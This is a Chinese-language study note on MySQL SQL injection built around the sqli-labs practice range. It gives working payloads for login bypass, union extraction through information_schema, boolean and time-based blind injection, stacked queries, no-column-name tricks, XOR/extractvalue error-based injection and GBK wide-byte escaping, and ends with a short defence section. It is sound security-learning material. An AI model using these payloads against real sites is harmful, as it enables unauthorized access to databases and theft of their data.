# SQL注入
📎[sqli-labs-master.zip](https://www.yuque.com/attachments/yuque/0/2022/zip/22941704/1667991587463-94414de8-d1cb-4b9c-ae76-19a6ea12b64b.zip)
### 关于靶场搭建
1. php版本问题

PHP版本不兼容的缘故，可以通过把PHP版本换到5.x版本解决，经过尝试最优选择应该是5.4.45版本
因为PHP5.x版本时，php连接Mysql数据库会使用`mysql_connect()`连接，PHP7.x版本连接数据库会使用`mysqli_connect()`连接，而GitHub上的源码最近更新已经是五年前了，所以对PHP高版本会出现不兼容的情况。

关于将`magic_quotes_gpc`改为`off`（开启`magic_quotes_gpc=on`之后，相当于使用`addslshes()`这个函数，会在单引号前加反斜线注释）以避免单引号被自动加反斜线（/）注释掉的问题，也可以通过换php版本来解决

2. mysql版本问题

经测试低版本在查表时会出错，故直接使用最新版本即8.0.12版本即可

3. 关于配置文件的问题

下面这篇博客里收录一些常见问题，里面的坑全都踩过一遍
https://blog.csdn.net/qq_43968080/article/details/103613087

4. 80端口被占用问题

这个问题可能属于个别现象，但是困扰我很久，于是在此也记录下来

第一类：被system占用，参考https://www.cnblogs.com/selier/p/9514426.html
https://blog.csdn.net/weixin_44248000/article/details/103432778

第二类：被httpd.exe占用，参考https://blog.csdn.net/speedwaycl/article/details/49023223
一个未经尝试的解决办法https://www.cnblogs.com/starksoft/p/9131665.html

## Mysql

### 原理及基本思路
#### 原理

~~学习前建议先了解基础的mysql语言~~

当我们访问动态网页时, Web 服务器会向数据访问层发起 Sql 查询请求，如果权限验证通过就会执行 Sql 语句。
这种网站内部直接发送的Sql请求一般不会有危险，但实际情况是很多时候需要**结合用户的输入数据动态构造 Sql 语句**；当用户使用sql查询语句时没有遵循**代码与数据分离**，输入的数据就会被当作代码执行

#### 思路

##### 判断是否存在sql注入

判断方法：

1.id后加单引号，根据错误提示获取信息（**字符型注入**）

原理是**单引号成功被数据库解析**，而无论字符型还是整型都会**因为单引号个数不匹配**而报错,无报错并不代表不存在sql注入漏洞，因为页面可能对单引号作了过滤，这时可以考虑使用**判断语句**进行注入

例如访问`id=1' order by 1%23`，页面回显的sql语句是`SELECT * FROM users WHERE id='1' order by 1#'LIMIT0,1`，由于#后面的语句都会被注释掉，所以真正执行的语句是`SELECT * FROM users WHERE id='1' order by 1`

此处`%23`即为url编码中的`#`，在mysql中`#`的作用是注释符（`--+`；`--` ；`#`；均为注释符号）

2.1=1、1=2测试法，流程如下（**数字型注入**）

① `url?id=1`② `url?id=1 ;and 1=1`③ `url?id=1 ;and 1=2`

存在注入漏洞的表现:

> 原理是:判断原网址是否对输入信息有过滤

① 正常显示；② 正常显示，内容基本与①相同；③ 提示`BOF`或`EOF`（程序没做任何判断时）、或提示找不到记录（判断了rs.eof时）、或显示内容为空（程序加了`on error resume next`）

不存在的表现：

①同样正常显示，②和③一般都会有程序定义的错误提示，或提示类型转换时出错。

 还可以使用特定函数来判断，比如输入`1 and version()>0`，程序返回正常，说明`version()`函数被数据库识别并执行，而`version()`函数是MySQL特有的函数，因此可以推断后台数据库为MySQL。

**数值型注入常用总结**
??? "点击展开/收起"

    and1=2--+

    'and1=2--+
    
    "and1=2--+
    
    )and1=2--+
    
    ')and1=2--+
    
    ")and1=2--+
    
    "))and1=2--+

##### `union`联合注入

> 利用union联合注入或其他语句来获取想要得到的信息

`ORDER BY`语句的简单应用

`ORDER BY` 语句用于**根据指定的列对结果集进行排序**。

在1'判断的例子中，`order by` 语句用于猜解字段数和列数，若不存在则会回显出错

`1' order by n--+`   ，n为指定列

ORDER BY 语句默认按照升序对记录进行排序，如果希望按照降序对记录进行排序，可以使用 `DESC` 关键字，例如

以字母顺序显示公司名称（Company）

`SELECT Company, OrderNumber FROM Orders ORDER BY Company`

以逆字母顺序显示公司名称

`SELECT Company, OrderNumber FROM Orders ORDER BY Company DESC`

一些常用的联合查询语句

`1' union select database(),user()#`

- `database()`将会返回当前网站所使用的数据库名字.

- `user()`将会返回执行当前查询的用户名.

`1' union select version(),@@version_compile_os#`

- `version()` 获取当前数据库版本.

- `@@version_compile_os` 获取当前操作系统

`1' union select table_name,table_schema from information_schema.tables where table_schema= '[ ]'#`

通过此语句可以查询到**指定库内的所有表和表名**，最后的方框中填入想要查询的数据库名即可

`information_schema` 是 `mysql` 自带的一张表，这张数据表保存了 Mysql 服务器所有数据库的信息,如数据库名，数据库的表，表栏的数据类型与访问权限等。该数据库拥有一个名为 `tables` 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库。

`-1' union select 1,2,(concat_ws(char(),user(),version(),database()))%23`

能够获取当前数据库的库名，版本和连接用户，其中`concat_ws()`函数的作用是从数据库里取n个字段组合到一起并用符号分割显示，`char()`能够将十进制ASCII码转换为字符，%23为url编码中的#

- `group_concat()`与`concat_ws()`的区别是前者将**列**组合显示，后者将**行**组合显示

- `information_schema`：表示所有信息，包括库、表、列

- `information_schema.tables`：记录所有表名信息的表

- `information_schema.columns`：记录所有列名信息的表

- `table_schema`：数据库的名称

- `table_name`:表名

- `column_name`:列名

- `group_concat()`:显示所有查询到的数据

##### 漏洞利用手法

1.利用 Sql 漏洞绕过登录验证

> 利用注释符#和1=1的恒成立来绕过登陆验证

一般情况下弱类型密码是很难手动爆破的，例如123

但是若存在sql漏洞，在用户名中输入 `123' or 1=1 #`, 密码输入 `123' or 1=1 #`（也可空白），则可以验证成功

实际执行的语句是：

`select * from users where username='123' or 1=1 #' and password='123' or 1=1 #'`

按照 Mysql 语法，# 后面的内容会被忽略，所以实际执行的语句如下

`select * from users where username='123' or 1=1 `


在用户名中输入 `123' or '1'='1`, 密码输入 `123' or '1'='1`（不加单引号会造成语法错误），实际执行语句如下

`select * from users where username='123' or '1'='1' and password='123' or '1'='1`

**or条件使and两端验证结果有一个成立即可都成立，从而绕过验证，无需使用注释符**

#### 其他实用语句

1.`INSERT INTO`语句，用于向表中插入新的行或列

- `INSERT INTO 表名称 VALUES (值1, 值2,....`

- `INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)`

2.`SQL UPDATE` 语句，用于修改表中数据

- `UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值`

3.`DELETE` 语句，用于删除表中的行

- `DELETE FROM 表名称 WHERE 列名称 = 值`

可以在不删除表的情况下删除所有的行，同时保持表的结构、属性和索引完整

- `DELETE FROM table_name`
- `DELETE * FROM table_name`

星号（*）是选取所有列的快捷方式。

#### SQL 通配符

在搜索数据库中的数据时，SQL 通配符可以替代一个或多个字符。

在 SQL 中，可使用以下通配符：

通配符	描述
%	代表零个或多个字符
_	仅替代一个字符
[charlist]	字符列中的任何单一字符
[^charlist]或者[!charlist]	不在字符列中的任何单一字符

`SELECT * FROM 表名 WHERE 列名 LIKE '[   ]'`

在[  ]中，可利用通配符查找与指定值（例如123）相关的数据

`123%`以123开头的数据；`%123%`包含123的数据；`_123`第一个字符后是123的数据，同理`1_2_3`

### 常见注入方法

#### 布尔盲注

布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回`True` 或者 `false`，构造SQL语句，利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false，从而达到注入的目的来获取信息

    ascii() 函数，返回字符ascii码值
        参数 : str单字符
    length() 函数，返回字符串的长度
        参数 : str 字符串
    left() 函数，返回从左至右截取固定长度的字符串
        参数str,length
        str : 字符串
        length：截取长度
    substr()/substring() 函数 ， 返回从pos位置开始到length长度的子字符串
        参数，str，pos，length
        str: 字符串
        pos：开始位置
        length： 截取长度

##### 注入流程

~~一般为~~
??? "点击展开/收起"

    （1）求当前数据库长度

    （2）求当前数据库表的ASCII

    （3）求当前数据库中表的个数

    （4）求当前数据库中其中一个表名的长度

    （5）求当前数据库中其中一个表名的ASCII

    （6）求列名的数量

    （7）求列名的长度

    （8）求列名的ASCII

    （9）求字段的数量

    （10）求字段内容的长度

    （11）求字段内容对应的ASCII

   步骤非常繁琐

##### 相关sql语句

??? "点击展开/收起"
    ###### 求当前数据库的长度

    思路：利用`length`或者`substr`函数来完成

    `length`函数

    - str    返回字符串的长度

    `substr`函数

    - str    字符串
    - pos    截取字符串开始位置

    `length`    截取字符的长度

    `length` 函数返回长度，例如8是当前数据库'security'的长度

    `SELECT * from users WHERE id = 1 and (length(database())=8)`

    - 也可以使用 `> `、`<` 符号来进一步缩小范围

    `SELECT * from users WHERE id = 1 and (length(database())>8)`

    - 当长度正确就页面就显示正常，其余页面则显示错误

    `substr`函数

    在构造SQL语句之时，and后面如果跟着一个大于0的数，那么SQL语句正确执行，所以利用此特性，使用`substr`截取字符，当截取的字符不存在，再通过`ascii`函数处理之后将会变成false，页面将回显错误

    - `substr` 返回子字符串
    - 8是当前数据库'security'的长度 ，从第8个开始，取1位，则是'y'
    - 如果pos为9 那么开始位置大于字符串长度，ascii函数处理后将变成false
    - and 后只要不为 0, 页面都会返回正常

    `SELECT * from users WHERE id = 1 and ascii(substr(database(),8,1))`

    ###### 求当前数据库名

    思路：利用`left` 函数，从左至右截取字符串

    截取字符判断字符的`ascii`码，从而确定字符

    -- 从左至右截取一个字符

    `SELECT * from users WHERE id = 1 and (left(database(),1)='s')`

    -- 从左至右截取两个字符

    `SELECT * from users WHERE id = 1 and (left(database(),2)='se')`

    `SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),1,1)) = 115)`

    `SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),2,1)) = 101)`

    使用`>`，`<` 符号来比较查找，找到一个范围，最后再确定

    ###### 求当前数据库存在的表的数量

    `SELECT * from users WHERE id = 1 AND `

    ``(select count(table_name) from information_schema.`TABLES`; where table_schema = database()) = 4``

    ###### 求当前数据库表的表名长度

    - length

    ``SELECT * from users WHERE id = 1 AND (LENGTH((select table_name from information_schema.`TABLES` where table_schema = database() LIMIT 0,1))) = 6``
    
    - substr

    ``SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),6,1))``

    ###### 求表名

    ``SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),1,1)) = 101``

    ``SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),2,1)) = 109``

    ###### 求指定表中列的数量

    ``SELECT * from users WHERE id = 1 AND (select count(column_name) from information_schema.columns where table_name = "users") = 3``

    ###### 求指定表中列的长度

    ``SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select column_name from information_schema.columns where table_name = "users" limit 0,1),2,1))``

    ###### 求指定表中的列名

    ``SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select column_name from information_schema.columns where table_name = "users" limit 0,1),1,1)) = 105``

    ###### 求指定表中某字段的数量

    ``SELECT * from users WHERE id = 1 AND (select count(username) from users) = 13``

    ###### 求字段长度

    ``SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select username from users  limit 0,1),4,1))``

    ###### 求字段名

    ``SELECT * from users WHERE id = 1 and ASCII(SUBSTR((select username from users  limit 0,1),1,1))  = 68``



#### 时间盲注

时间盲注又称延迟注入，是一种盲注的手法, 提交对执行时间敏感的函数sql语句，通过执行时间的长短来判断是否执行成功，比如:正确的话会导致时间很长，错误的话会导致执行时间很短。~~SQLMAP、穿山甲、胡萝卜等主流注入工具可能检测不出~~，只能手工检测，或利用脚本程序跑出结果。

时间盲注主要用到`sleep()`函数，除此之外还有`benchmark()`

时间盲注比布尔盲注难度稍高 ，关键在于不论你怎么输入就是不报错

时间盲注的sql语句很好理解，如

##### sleep(seconds)

- seconds: sleep的秒数

`id= 1’ or sleep(3) %23`

如果这个时候直接服务器过了三秒才反应，那么就存在时间注入

也可以添加if语句，控制if第一个参数

`id= 1’ or if(1,sleep(3),0) %23`

如果某一个条件正确就延迟三秒，如果错误就返回0 (也就是if第一个参数为1)     

具体的注入语句示例如下

`id= 1’ or if((select table_name from information_schema.tables where table_schema=database() limit 0,1),sleep(3),0) %23`

##### benchmark(count, expr)

- count: 执行次数（必须为正整数）
- expr: 要重复执行的表达式（通常是一个计算密集型操作）

MySQL 会计算 expr 指定的表达式 count 次，返回结果始终是 0

`select if(1=1,benchmark(10000000,md5('test')),0)`

如果条件为真，则执行大量计算导致延迟；为假则立即返回。

例如探测数据库名长度

`select if(length(database())=8, benchmark(10000000,md5('test')), 0)`


后面的盲注过程与布尔盲注类似




#### 堆叠注入

堆叠注入，顾名思义，就是将语句堆叠在一起进行查询

原理：`mysql_multi_query()` 支持多条sql语句同时执行，语句间以分号（;）分隔,在 ; 结束一个sql语句后继续构造下一条语句，两条语句会一起执行，这就是堆叠注入。

但在实际场景中为了防止sql注入机制，往往使用调用数据库的函数是`mysqli_ query()`函数，其只能执行一条语句，分号后面的内容将不会被执行，所以堆叠注入的使用条件十分有限

其与联合注入的相同点在于是将两条语句合并在一起，而区别是`union` 或者`union all`执行的语句类型是有限的，常见的是用来执行查询语句，而堆叠注入可以执行的是任意的语句。在字符长度限制范围内，堆叠注入可以执行多条语句

在过滤了 `select` 和 `where` 的情况下，还可以使用 `show`来爆出数据库名，表名，和列名。

- show

        show datebases; //数据库。
        show tables; //表名。
        show columns from table; //字段。

- alert

作用：修改已知表的列。（ 添加：add | 修改：alert，change | 撤销：drop ）

用法：

- 添加一个列

`alter table " table_name" add " column_name"  type;`

- 删除一个列

`alter table " table_name" drop " column_name"  type;`

- 改变列的数据类型

`alter table " table_name" alter column " column_name" type;`
    
- 改列名

`alter table " table_name" change " column1" " column2" type;`

`alter table "table_name" rename "column1" to "column2";`

#### 无列名注入

其实是针对`information_schema` 库被过滤的情况，导致不能直接读取列名

那么就需要用到其他库来注入, 例如: `sys.schema_auto_increment_columns`, `sys.schema_table_statistics_with_buffer`, `mysql.innodb_table_stats`等等

但是这些表都不能获得列名等, 只能获得表名，从而引出的无列名注入

主要目的是：获取列名，从而进行正常的注入

##### 子查询派生表

**原理**

无列名注入的原理是通过子查询连接查询两个相同的表, 数据库会建立一个虚拟表, 将两个表的查询数据放入, 当放入一个虚拟表中已有的列名时就会报错

**操作**

例如：`select * from (select * from users u1 join users u2) a;`

会产生派生表a,如果`users`中存在列名`id`就会报错

`Duplicate column name 'id'`

然后通过 `using` 来排除列名 `id`, 继续爆出其他的列名

`using` 会自动合并两个表中的相同列名

`select * from (select * from users u1 join users u2 using(id)) a;`

以此类推，可以爆出所有的表名

##### union派生表

**原理**

通过虚拟派生表的数字列名，来代替原有的列名

**操作**

通过union查询，需猜测列数，假设这里为5列

`select 1,2,3,4,5 union select * from table;`

会把table的数据存放到一个虚拟表中，同时为五个列设置别名1，2，3，4，5。

这时我们就可以通过别名1，2，3，4，5来代替列名，相当于列名被替换成了数字

进一步查询

``select 2 from (select 1,2,3,4,5 union select * from table)a;``

一些tips

**在数据库查询bypass过滤`**

php端不需要\`\`，但是在数据库中表名需要用\`\`来包裹,如\`table\`

这时``select 2 from (select 1,2,3,4,5 union select * from `table`)a;``

查询不出来数据（MySQL 5.7+ 已经支持数字作为列名了

如下才可以
``select `2` from (select 1,2,3,4,5 union select * from `table`)a;``

当为列名过滤``时，可以再次使用派生表别名来bypass

为派生表a的数字列名2设置别名b,通过b查询列名不再需要\`\`

``select b from (select 1,2 as b,3,4 as c,5 as d union select * from table) a``



**同时查询多个列**

``select concat(b,0x2d,c) from (select 1,2 as b,3 as c,4,5 union select * from `table`)a;``

`0x2d`是`-`，相当于查询2-3的列

[参考](https://err0r.top/article/mardasctf/#/)
[参考](https://erzbir.com/archives/no-column-sql-injection#/)


#### 异或注入

异或注入的原理是通过强制类型转化报错的错误信息来获取信息。

mysql里异或运算符为`^` 或者 `xor`，这里的异或注入主要利用`^`

两者的区别在于 `^`运算符做**位异或运算** 如`1^2=3`

而 `xor`做**逻辑运算** `1 xor 0` 会输出1，其他情况输出其他所有数据 

xor的作用包括但不限于**绕过敏感词过滤、判断过滤内容和直接进行盲注利用**


于是payload可以写成

`a' ^ extractvalue(1,concat('~',(select(database()))))#`

同理`updatexml()`函数也可以，用法相同

##### ^运算符

**原理**

^ ：要求两边都是数字，所以`extractvalue()`一定会执行（它需要先求值才能参与异或运算

extractvalue(1,concat('~',(select(database()))))

- extractvalue(): 这是是 MySQL 的 XML 处理函数
- 第一个参数`1`: 1是一个伪 XML 文档
- 第二个参数`concat()`: 使用 concat() 构建一个无效的 XPath 表达式

当被注入后`extractvalue()`被执行

会生成一个无效的 XPath 表达式（如 ~database_name）

MySQL 会返回一个错误信息，错误信息中会包含数据库名：

    XPATH syntax error: '~database_name'

同理

[]中的name替换为实际name即可

表名：`a'^extractvalue(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('[database_name]'))))`

列名：`a'^extractvalue(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('[table_name]'))))`

字段：`a'^extractvalue(1,concat('~',(select(group_concat([column_name]))from([database_nam].[table_name]))))`

tips：针对长度过滤限制

利用`right()`函数，和`left()`函数

若一个不行就同时使用

`a'^extractvalue(1,concat('~',(select(right([column_name],30))from([database_nam].[table_name]))))`


获取左边：

`a'or(updatexml("~",concat("~",(select(group_concat(left([column_name],25)))from([database_nam].[table_name]))),"~"))`

获取右边：

`a'or(updatexml("~",concat("~",(select(group_concat(right([column_name],25)))from([database_nam].[table_name]))),"~"))`



#### 宽字节注入

**基础概念**

宽字节是相对于ascii这样单字节而言的；
GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是宽字节，实际上只有两字节

这里所说的宽字节注入，其实是为了绕过转义函数（为了过滤用户输入的一些数据，对特殊的字符加上反斜杠“\”进行转义）

Mysql中转义的函数有`addslashes`，`mysql_real_escape_string`，`mysql_escape_string` 等

##### sql的执行过程

这里讲一下sql的执行过程中字符的变化

以php为例，当用户输入数据之后，php根据默认编码生成sql语句发送给服务器，没有设置`default_charset`的时候，php会根据数据库中的编码自动来确定使用那种编码

判断方式

```php
<?php $m=”字”; echo strlen($m); 
# 输出3说明是utf-8
# 输出2说明是gbk

```

服务器接收到请求后会把客户端编码的字符串转换成连接层编码字符串

> 具体流程是先使用系统变量 `character_set_client` 对 SQL 语句进行解码后，然后使用 系统变量 `character_set_connection` 对解码后的十六进制进行编码（默认都是gbk编码）

进行内部操作前，按照如下规则转化请求为内部操作字符集

    使用字段 `CHARACTER SET` 设定值

    若上述值不存在，使用对应数据表的`DEFAULT CHARACTER SET`设定值

    若上述值不存在，则使用对应数据库的`DEFAULT CHARACTER SET`设定值

    若上述值不存在，则使用`character_set_server`设定值（默认gbk编码）

执行完 SQL 语句之后，将执行结果按照 `character_set_results` 编码进行输出。

##### 原理

宽字节注入指的是 mysql 数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），


宽字节注入发生的位置就是
PHP发送请求到MYSQL时字符集使用`character_set_client`设置值进行了一次编码，
然后服务器会根据`character_set_connection`把请求进行转码，从`character_set_client`转成`character_set_connection`，
然后更新到数据库的时候，再转化成字段所对应的编码


##### addslashes()
当使用`addslashes()`转义特殊字符的时候，会把'即`%27`转义成\\'，即`%5c%27`

此时输入1' 此时的sql语句为

`select * from tables where id = '1 \''`


可以构造特殊字符`%df%27`,转义后为`%df%5c%27`,mysql会把`%df%5c`识别成宽字节转化成汉字`運`

数据变化过程

    %df%27===>(addslashes)====>%df%5c%27====>(GBK)====>運'
    ​
    用户输入==>过滤函数==>代码层的$sql==>mysql处理请求==>mysql中的sql

从而使输入`%df%27`转化成了`運'`导致sql语句被闭合

输入`%df' --'`即可使'逃逸同时注释后面的'，这样就可以构造注入语句了

此时的sql语句

`select * from tables where id = '1 運' --\''`

##### iconv()

为了避免宽字节注入,使用iconv函数（能够完成各种字符集间的转换）

```php

$id = isset($_GET['id']) ? addslashes($_GET['id']) : 1;
$id = iconv('utf-8', 'gbk', $id); # 由utf-8 –> gbk

```

可以使用逆向思维，先找一个gbk的汉字錦,錦的utf-8编码是`0xe98ca6`，它的gbk编码是`0xe55c`,

当传入的值是`錦'`，`'`通过`addslashes`转义为`\'`(%5c%27)

錦通过`icov`转换为`%e5%5c`，最终`錦'`变为了`%e5%5c%5c%27`,不难看出`%5c%5c`正好把反斜杠转义，使单引号逃逸，造成注入

字符变化

    錦%27===>(addslashes)====>錦%5c%27====>(iconv)====>%e5%5c%5c%27====>錦'====>錦'
    
    用户输入===>过滤函数===>代码层的$sql===>转换函数===>代码层的$sql===>mysql处理请求===>mysql中的sql


这里在经过`icov()`函数转化后，已经是gbk编码了，原来的只有`addslashes()`时，mysql处理的是ascii单字节字符（**宽字节注入的总结：传入是单字节，传出是双字节**），这里的`%e5%5c%5c%27`已经为gbk编码即`錦'`


##### 防护

    使用mysql_set_charset(GBK)指定字符集

    SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary
    
    使用mysql_real_escape_string进行转义

    mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集（使用mysql_set_charset指定字符集），不会出现前面的df和5c拼接为一个宽字节的问题
    以上两个条件需要同时满足才行，缺一不可。



[参考](https://cs-cshi.github.io/cybersecurity/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%B7%B1%E5%BA%A6%E8%AE%B2%E8%A7%A3/#/)